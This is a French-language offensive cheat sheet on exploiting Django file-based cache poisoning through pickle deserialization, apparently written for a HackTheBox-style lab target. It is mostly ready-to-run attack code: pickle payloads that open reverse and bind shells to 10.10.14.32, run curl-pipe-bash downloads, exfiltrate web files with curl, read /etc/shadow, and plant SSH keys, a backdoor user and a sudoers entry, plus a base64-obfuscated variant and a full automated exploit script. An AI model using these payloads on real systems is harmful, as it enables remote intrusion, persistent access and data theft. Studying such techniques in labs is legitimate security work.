# Django Cache Poisoning

## <mark style="color:red;">🔓 Django Cache Poisoning & Pickle Deserialization RCE</mark>

### <mark style="color:blue;">📋 Vue d'ensemble</mark>

**Type de vulnérabilité:** Insecure Deserialization + Cache Poisoning\
**Framework concerné:** Django (FileBasedCache, MemcachedCache, RedisCache)\
**Sévérité:** Critique (RCE direct)\
**CWE:** CWE-502 (Deserialization of Untrusted Data)\
**OWASP:** A08:2021 - Software and Data Integrity Failures

***

### <mark style="color:blue;">🎯 Principes de base</mark>

#### <mark style="color:green;">Qu'est-ce que le cache Django ?</mark>

Django propose plusieurs backends de cache pour améliorer les performances :

```python
CACHES = {
    'default': {
        'BACKEND': 'django.core.cache.backends.filebased.FileBasedCache',
        'LOCATION': '/var/tmp/django_cache',
    }
}
```

**Backends de cache Django**

| Backend            | Description               | Risque Pickle   |
| ------------------ | ------------------------- | --------------- |
| **FileBasedCache** | Stockage sur disque       | ✅ Oui - Haute   |
| **MemcachedCache** | Cache mémoire (Memcached) | ✅ Oui - Moyenne |
| **RedisCache**     | Cache Redis               | ✅ Oui - Moyenne |
| **DatabaseCache**  | Stockage en BDD           | ✅ Oui - Moyenne |
| **LocMemCache**    | Cache mémoire local       | ✅ Oui - Faible  |
| **DummyCache**     | Pas de cache (dev)        | ❌ Non           |

#### <mark style="color:green;">🔴 Pourquoi c'est dangereux ?</mark>

Django utilise **pickle** pour sérialiser les objets Python en cache :

```python
# Django cache.py (simplifié)
def set(self, key, value, timeout):
    pickled_value = pickle.dumps(value)  # Sérialisation
    self._write_to_cache(key, pickled_value)

def get(self, key):
    pickled_value = self._read_from_cache(key)
    return pickle.loads(pickled_value)  # ⚠️ DÉSÉRIALISATION NON SÛRE
```

**Le problème:** `pickle.loads()` exécute du code arbitraire si le fichier est contrôlé par un attaquant !

***

### <mark style="color:blue;">🔍 Détection</mark>

#### <mark style="color:green;">1. Identifier le backend de cache</mark>

**Via les fichiers de configuration**

```bash
# Rechercher settings.py
find /var/www -name "settings.py" 2>/dev/null
find /opt -name "settings.py" 2>/dev/null

# Rechercher la config CACHES
grep -r "CACHES" /var/www/ 2>/dev/null
grep -r "FileBasedCache" /var/www/ 2>/dev/null

# Exemples de chemins communs
cat /var/www/html/project/settings.py
cat /opt/app/config/settings.py
cat /home/user/django_app/settings.py
```

**Configuration typique vulnérable**

```python
# settings.py
CACHES = {
    'default': {
        'BACKEND': 'django.core.cache.backends.filebased.FileBasedCache',
        'LOCATION': '/var/tmp/django_cache',  # ⚠️ Directory writable
    }
}
```

#### <mark style="color:green;">2. Localiser les fichiers de cache</mark>

```bash
# Chemins communs
/var/tmp/django_cache/
/tmp/django_cache/
/var/cache/django/
/home/user/.cache/django/

# Recherche
find / -name "*.djcache" 2>/dev/null
find /var/tmp -type f -name "*.djcache" 2>/dev/null
find /tmp -type f -name "*.djcache" 2>/dev/null

# Lister les fichiers
ls -la /var/tmp/django_cache/
# Exemple de sortie:
# -rw-r--r-- 1 www-data www-data 1234 Dec 29 20:15 1f0acfe7480a469402f1852f8313db86.djcache
# -rw-r--r-- 1 www-data www-data 5678 Dec 29 20:16 90dbab8f3b1e54369abdeb4ba1efc106.djcache
```

#### <mark style="color:green;">3. Identifier les vues cachées</mark>

```python
# Rechercher @cache_page decorator
grep -r "@cache_page" /var/www/ 2>/dev/null
grep -r "cache_page" /var/www/ 2>/dev/null

# Exemple de vue cachée
@cache_page(60)  # Cache pendant 60 secondes
def explore(request):
    posts = Post.objects.all()
    return render(request, 'explore.html', {'posts': posts})
```

#### <mark style="color:green;">4. Vérifier les permissions</mark>

```bash
# Le répertoire de cache doit être writable
ls -la /var/tmp/django_cache/
# drwxrwxrwx ou drwxrwxr-x avec votre user dans le groupe

# Test d'écriture
touch /var/tmp/django_cache/test.txt
# Si succès → Exploitation possible!
```

***

### <mark style="color:blue;">💣 Exploitation</mark>

#### <mark style="color:green;">Phase 1 : Reconnaissance</mark>

**Script de reconnaissance**

```bash
#!/bin/bash

echo "[*] Django Cache Reconnaissance"
echo "================================"

# 1. Trouver settings.py
echo "[+] Recherche de settings.py..."
find / -name "settings.py" -type f 2>/dev/null | while read file; do
    echo "    [>] $file"
    grep -A 5 "CACHES" "$file" 2>/dev/null
done

# 2. Trouver les fichiers .djcache
echo "[+] Recherche des fichiers .djcache..."
find / -name "*.djcache" -type f 2>/dev/null | while read file; do
    echo "    [>] $file"
    ls -lh "$file"
done

# 3. Tester les permissions
echo "[+] Test des permissions..."
for dir in /var/tmp/django_cache /tmp/django_cache /var/cache/django; do
    if [ -d "$dir" ]; then
        echo "    [>] Directory trouvé: $dir"
        ls -la "$dir" 2>/dev/null
        if touch "$dir/test_write" 2>/dev/null; then
            echo "    [✓] WRITABLE!"
            rm "$dir/test_write"
        else
            echo "    [✗] Not writable"
        fi
    fi
done
```

#### <mark style="color:green;">Phase 2 : Génération du payload Pickle</mark>

**Payload basique (Reverse Shell)**

```python
#!/usr/bin/env python3
import pickle
import os

class RCEPayload:
    """
    Payload de désérialisation pickle pour RCE
    """
    def __reduce__(self):
        # __reduce__ est appelé lors de la sérialisation
        # Retourne (callable, args) qui sera exécuté lors de loads()
        cmd = 'bash -c "bash -i >& /dev/tcp/10.10.14.32/4444 0>&1"'
        return (os.system, (cmd,))

# Générer le payload sérialisé
if __name__ == "__main__":
    payload = pickle.dumps(RCEPayload())
    
    # Afficher en hex pour debug
    print("[+] Payload généré:")
    print(payload.hex())
    
    # Sauvegarder dans un fichier
    with open("payload.pkl", "wb") as f:
        f.write(payload)
    
    print(f"[+] Payload sauvegardé: payload.pkl ({len(payload)} bytes)")
```

**Payloads alternatifs**

```python
import pickle
import os
import subprocess

# 1. Reverse Shell amélioré
class RevShell:
    def __reduce__(self):
        cmd = '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.32/4444 0>&1"'
        return (os.system, (cmd,))

# 2. Lecture de fichier
class ReadFile:
    def __reduce__(self):
        return (subprocess.check_output, (['cat', '/etc/shadow'],))

# 3. Ajout de clé SSH
class AddSSHKey:
    def __reduce__(self):
        cmd = 'echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys'
        return (os.system, (cmd,))

# 4. Création d'utilisateur backdoor
class AddUser:
    def __reduce__(self):
        cmd = 'useradd -m -p $(openssl passwd -1 password123) backdoor'
        return (os.system, (cmd,))

# 5. Download & Execute
class DownloadExec:
    def __reduce__(self):
        cmd = 'curl http://10.10.14.32/shell.sh | bash'
        return (os.system, (cmd,))

# 6. Exfiltration de données
class Exfiltrate:
    def __reduce__(self):
        cmd = 'tar czf - /var/www/html | curl -X POST -d @- http://10.10.14.32:8000/exfil'
        return (os.system, (cmd,))

# Générer un payload
payload = pickle.dumps(RevShell())
```

**Payload avec obfuscation**

```python
import pickle
import base64

class ObfuscatedRCE:
    def __reduce__(self):
        # Commande encodée en base64
        cmd_b64 = "YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zMi80NDQ0IDA+JjEi"
        cmd = f'echo {cmd_b64} | base64 -d | bash'
        return (os.system, (cmd,))

payload = pickle.dumps(ObfuscatedRCE())
```

#### <mark style="color:green;">Phase 3 : Injection du payload</mark>

**Méthode 1 : Remplacement de fichier de cache**

```python
#!/usr/bin/env python3
import pickle
import os

class RCEPayload:
    def __reduce__(self):
        cmd = 'bash -c "bash -i >& /dev/tcp/10.10.14.32/4444 0>&1"'
        return (os.system, (cmd,))

# Configuration
CACHE_DIR = "/var/tmp/django_cache"
TARGET_VIEW = "explore"  # Vue avec @cache_page

# Générer payload
payload = pickle.dumps(RCEPayload())

# Trouver et remplacer les fichiers de cache
for filename in os.listdir(CACHE_DIR):
    if filename.endswith(".djcache"):
        filepath = os.path.join(CACHE_DIR, filename)
        
        print(f"[*] Traitement de {filename}")
        
        # Supprimer l'ancien cache
        try:
            os.remove(filepath)
            print(f"    [+] Fichier supprimé")
        except Exception as e:
            print(f"    [-] Erreur suppression: {e}")
            continue
        
        # Écrire le payload malveillant
        try:
            with open(filepath, "wb") as f:
                f.write(payload)
            print(f"    [+] Payload injecté dans {filename}")
        except Exception as e:
            print(f"    [-] Erreur écriture: {e}")

print("[*] Injection terminée!")
print("[*] Déclenchement: Accédez à la vue cachée (ex: /explore)")
```

**Méthode 2 : Exploitation avec timing précis**

```python
#!/usr/bin/env python3
"""
Exploitation avec synchronisation précise
Utile quand le cache est régulièrement régénéré
"""

import pickle
import os
import time
import requests
from threading import Thread

class RCEPayload:
    def __reduce__(self):
        cmd = 'bash -c "bash -i >& /dev/tcp/10.10.14.32/4444 0>&1"'
        return (os.system, (cmd,))

# Configuration
TARGET_URL = "http://hacknet.htb/explore"
CACHE_DIR = "/var/tmp/django_cache"
CACHE_TIMEOUT = 60  # Durée du cache en secondes

def poison_cache():
    """Empoisonne tous les fichiers de cache"""
    payload = pickle.dumps(RCEPayload())
    
    for filename in os.listdir(CACHE_DIR):
        if filename.endswith(".djcache"):
            filepath = os.path.join(CACHE_DIR, filename)
            try:
                os.remove(filepath)
                with open(filepath, "wb") as f:
                    f.write(payload)
                print(f"[+] Poisonné: {filename}")
            except Exception as e:
                print(f"[-] Erreur: {e}")

def trigger_cache():
    """Déclenche le chargement du cache empoisonné"""
    time.sleep(1)  # Laisser le temps au poison
    try:
        print(f"[*] Déclenchement de {TARGET_URL}")
        response = requests.get(TARGET_URL, timeout=5)
        print(f"[+] Réponse: {response.status_code}")
    except Exception as e:
        print(f"[+] Exception (RCE probablement déclenché): {e}")

# Exécution
print("[*] Démarrage de l'exploitation...")
print("[*] Assurez-vous qu'un listener netcat est actif sur port 4444")

# Empoisonner en thread séparé
poison_thread = Thread(target=poison_cache)
poison_thread.start()

# Déclencher le cache
trigger_cache()

poison_thread.join()
print("[*] Exploitation terminée!")
```

#### <mark style="color:green;">Phase 4 : Déclenchement</mark>

```bash
# 1. Démarrer le listener
nc -lvnp 4444

# 2. Dans un autre terminal, déclencher le cache
curl http://hacknet.htb/explore

# 3. OU avec un script
python3 trigger.py
```

**Script de déclenchement automatique**

```python
#!/usr/bin/env python3
import requests
import time

TARGET_URL = "http://hacknet.htb/explore"
COOKIES = {
    'sessionid': 'your_session_id',
    'csrftoken': 'your_csrf_token'
}

print("[*] Déclenchement du cache empoisonné...")

for i in range(5):
    try:
        response = requests.get(TARGET_URL, cookies=COOKIES, timeout=5)
        print(f"[{i+1}] Status: {response.status_code}")
        time.sleep(2)
    except requests.exceptions.Timeout:
        print(f"[{i+1}] Timeout - RCE possiblement déclenché!")
    except Exception as e:
        print(f"[{i+1}] Exception: {e}")

print("[*] Vérifiez votre listener netcat!")
```

***

### <mark style="color:red;">🛠️ Exploitation complète - Script tout-en-un</mark>

{% code fullWidth="true" %}
```python
#!/usr/bin/env python3
"""
Django FileBasedCache RCE Exploit
Exploitation complète du cache Django via pickle deserialization
"""

import pickle
import os
import sys
import argparse
import requests
from pathlib import Path

class DjangoCacheRCE:
    def __init__(self, cache_dir, lhost, lport):
        self.cache_dir = Path(cache_dir)
        self.lhost = lhost
        self.lport = lport
        self.payload = None
    
    def generate_payload(self, payload_type="reverse_shell"):
        """Génère le payload pickle"""
        
        if payload_type == "reverse_shell":
            class RCE:
                def __reduce__(inner_self):
                    cmd = f'bash -c "bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"'
                    return (os.system, (cmd,))
        
        elif payload_type == "bind_shell":
            class RCE:
                def __reduce__(inner_self):
                    cmd = f'nc -e /bin/bash -lvp {self.lport}'
                    return (os.system, (cmd,))
        
        elif payload_type == "add_user":
            class RCE:
                def __reduce__(inner_self):
                    cmd = 'useradd -m -p $(openssl passwd -1 pwned123) pwned && echo "pwned ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers'
                    return (os.system, (cmd,))
        
        elif payload_type == "ssh_key":
            class RCE:
                def __reduce__(inner_self):
                    key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... your_key_here"
                    cmd = f'mkdir -p /root/.ssh && echo "{key}" >> /root/.ssh/authorized_keys'
                    return (os.system, (cmd,))
        
        else:
            print(f"[-] Type de payload inconnu: {payload_type}")
            sys.exit(1)
        
        self.payload = pickle.dumps(RCE())
        print(f"[+] Payload généré: {len(self.payload)} bytes")
        return self.payload
    
    def check_permissions(self):
        """Vérifie les permissions sur le répertoire de cache"""
        if not self.cache_dir.exists():
            print(f"[-] Répertoire inexistant: {self.cache_dir}")
            return False
        
        test_file = self.cache_dir / ".test_write"
        try:
            test_file.touch()
            test_file.unlink()
            print(f"[+] Répertoire writable: {self.cache_dir}")
            return True
        except PermissionError:
            print(f"[-] Permissions insuffisantes sur: {self.cache_dir}")
            return False
    
    def list_cache_files(self):
        """Liste les fichiers de cache"""
        cache_files = list(self.cache_dir.glob("*.djcache"))
        print(f"[+] {len(cache_files)} fichiers de cache trouvés:")
        for f in cache_files:
            print(f"    - {f.name} ({f.stat().st_size} bytes)")
        return cache_files
    
    def poison_cache(self, target_file=None):
        """Empoisonne les fichiers de cache"""
        if not self.payload:
            print("[-] Générez d'abord un payload!")
            return False
        
        cache_files = [target_file] if target_file else list(self.cache_dir.glob("*.djcache"))
        
        poisoned = 0
        for cache_file in cache_files:
            try:
                # Supprimer l'ancien cache
                cache_file.unlink(missing_ok=True)
                
                # Écrire le payload
                with open(cache_file, "wb") as f:
                    f.write(self.payload)
                
                print(f"[+] Empoisonné: {cache_file.name}")
                poisoned += 1
            
            except Exception as e:
                print(f"[-] Erreur sur {cache_file.name}: {e}")
        
        print(f"[+] {poisoned} fichiers empoisonnés")
        return poisoned > 0
    
    def trigger_exploit(self, target_url, cookies=None):
        """Déclenche l'exploitation"""
        print(f"[*] Déclenchement de {target_url}")
        
        try:
            response = requests.get(target_url, cookies=cookies, timeout=5)
            print(f"[+] Réponse: {response.status_code}")
            return True
        except requests.exceptions.Timeout:
            print("[!] Timeout - RCE probablement déclenché!")
            return True
        except Exception as e:
            print(f"[!] Exception: {e}")
            return True
    
    def full_exploit(self, target_url, cookies=None, payload_type="reverse_shell"):
        """Exploitation complète"""
        print("\n" + "="*60)
        print("Django FileBasedCache RCE Exploit")
        print("="*60 + "\n")
        
        # 1. Vérifier permissions
        if not self.check_permissions():
            return False
        
        # 2. Lister les caches
        self.list_cache_files()
        
        # 3. Générer payload
        self.generate_payload(payload_type)
        
        # 4. Empoisonner le cache
        if not self.poison_cache():
            return False
        
        # 5. Setup listener reminder
        print(f"\n[!] Assurez-vous qu'un listener est actif:")
        print(f"    nc -lvnp {self.lport}\n")
        input("[*] Appuyez sur ENTER pour déclencher l'exploit...")
        
        # 6. Déclencher
        return self.trigger_exploit(target_url, cookies)

def main():
    parser = argparse.ArgumentParser(
        description="Django FileBasedCache Pickle Deserialization RCE"
    )
    parser.add_argument("--cache-dir", required=True, help="Répertoire du cache Django")
    parser.add_argument("--lhost", required=True, help="IP du listener (pour reverse shell)")
    parser.add_argument("--lport", required=True, type=int, help="Port du listener")
    parser.add_argument("--target-url", required=True, help="URL de la vue cachée")
    parser.add_argument("--payload", default="reverse_shell", 
                       choices=["reverse_shell", "bind_shell", "add_user", "ssh_key"],
                       help="Type de payload")
    parser.add_argument("--session", help="Cookie sessionid")
    parser.add_argument("--csrf", help="Cookie csrftoken")
    
    args = parser.parse_args()
    
    # Cookies optionnels
    cookies = {}
    if args.session:
        cookies['sessionid'] = args.session
    if args.csrf:
        cookies['csrftoken'] = args.csrf
    
    # Exploitation
    exploit = DjangoCacheRCE(args.cache_dir, args.lhost, args.lport)
    exploit.full_exploit(args.target_url, cookies, args.payload)

if __name__ == "__main__":
    main()

"""
UTILISATION:

# 1. Reverse Shell
python3 exploit.py \
    --cache-dir /var/tmp/django_cache \
    --lhost 10.10.14.32 \
    --lport 4444 \
    --target-url http://hacknet.htb/explore \
    --payload reverse_shell \
    --session "your_session_id"

# 2. Ajout d'utilisateur
python3 exploit.py \
    --cache-dir /var/tmp/django_cache \
    --lhost 10.10.14.32 \
    --lport 4444 \
    --target-url http://hacknet.htb/explore \
    --payload add_user

# 3. Bind Shell
python3 exploit.py \
    --cache-dir /var/tmp/django_cache \
    --lhost 10.10.14.32 \
    --lport 4444 \
    --target-url http://hacknet.htb/explore \
    --payload bind_shell
"""
```
{% endcode %}

***
